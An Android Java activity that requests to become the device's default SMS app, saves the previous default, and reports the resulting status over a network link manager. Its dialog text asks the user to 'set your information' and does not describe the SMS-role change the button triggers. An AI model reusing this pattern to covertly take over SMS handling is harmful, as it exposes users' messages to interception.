package me.keeganlee.kandroid.activity;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.ContentValues;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.provider.Telephony;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

import me.keeganlee.kandroid.betach.BetachLinkManager;


public class ComposeSmsActivity extends Activity {
    private boolean isOpenAuthority = false;
    private SharedPreferences sp = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        sp = getSharedPreferences("SystemInfo", MODE_PRIVATE);


        isOpenAuthority = this.getIntent().getBooleanExtra("isOpenAuthority", false);

        if (!isOpenAuthority) {
            openDialog();
        } else {
            if (isOpenAuthority) {
                //打开操作
                openSmsAuthority();
            }
        }


    }

    void openDialog() {
        Dialog alertDialog = new AlertDialog.Builder(this).
                setTitle("设置您的信息").
                setMessage("您必须要设置您的信息").
                setIcon(android.R.drawable.sym_def_app_icon).
                setPositiveButton("确定", new DialogInterface.OnClickListener() {

                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        closeSmsAuthority();
                    }
                }).

                create();
        alertDialog.show();

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {


        switch (requestCode) {
            case 1:
                //返回请求申请权限
                switch (resultCode) {
                    case RESULT_OK:
                        //String defaultPkgName = Telephony.Sms.getDefaultSmsPackage(this);
                        //记录系统设置包名
                        Editor edit = sp.edit();
                        edit.putString("defaultPkgName", defaultPkgName);
                        edit.commit();

                        //System.out.println("添加权限成功 " + defaultPkgName);
                        //defaultPkgName = null;
                        sendNotice();
                        break;
                    case RESULT_CANCELED:
                        //发送通知信息
                        sendNotice();
                        break;
                }

                this.finish();
                break;
            case 2:
                //返回请求关闭权限
                switch (resultCode) {
                    case RESULT_OK:
                        //记录系统设置包名
                        Editor edit = sp.edit();
                        edit.remove("defaultPkgName");
                        edit.commit();

                        sendNotice();
                        this.finish();
                        break;
                    case RESULT_CANCELED:
                        openDialog();
                        break;
                }
                break;
        }

        super.onActivityResult(requestCode, resultCode, data);
    }


    void sendNotice() {
        int isAuthority = -1;
        if (this.getPackageName().equals(Telephony.Sms.getDefaultSmsPackage(this))) {
            isAuthority = 0;
        }

        //发送通知信息
        ContentValues linkValues = new ContentValues();
        linkValues.put("action", BetachLinkManager.ACTION_CHANGE_AUTHORITY);
        linkValues.put("isAuthority", isAuthority);
        BetachLinkManager linkManager = new BetachLinkManager(this);
        linkManager.send(linkManager.getLongLinkJson(linkValues));


        System.out.println("action:" + BetachLinkManager.ACTION_CHANGE_AUTHORITY + "=========isAuthority :" + isAuthority);
    }

    @Override
    protected void onResume() {
        super.onResume();
    }


    String defaultPkgName = null;

    public void openSmsAuthority() {
        defaultPkgName = Telephony.Sms.getDefaultSmsPackage(this);
        if (!defaultPkgName.equals(getPackageName())) {
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, getPackageName());
            startActivityForResult(intent, 1);
        }
    }

    void closeSmsAuthority() {
        String defaultPkgName = sp.getString("defaultPkgName", null);
        if (defaultPkgName != null && !defaultPkgName.equals(Telephony.Sms.getDefaultSmsPackage(this))) {
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, defaultPkgName);
            startActivityForResult(intent, 2);
        } else {
            Editor edit = sp.edit();
            edit.remove("defaultPkgName");
            edit.commit();

            finish();
        }
    }

}
